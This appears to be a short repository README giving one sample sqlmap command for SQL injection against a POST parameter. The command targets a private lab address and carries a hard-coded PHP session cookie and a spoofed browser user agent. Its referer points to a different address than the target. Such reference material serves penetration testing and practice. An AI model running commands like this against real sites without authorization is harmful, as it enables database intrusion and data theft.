# SQLMapExamples
A list of sample SQL Map Injection Commands


# SQLMap Injection on POST parameter with a PHP Session ID
```
sqlmap.py -u "http://10.10.10.10/profile.php" --data="name=1234567890" --cookie="PHPSESSID=rbeph9bv25ive9k7sqjefnsujk" --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" --referer="http://10.10.10.176/profile.php" --delay=0 --timeout=30 --retries=0 --level=3 --risk=1 --threads=1 --time-sec=5 -b --batch --answers="crack=N,dict=N"
```


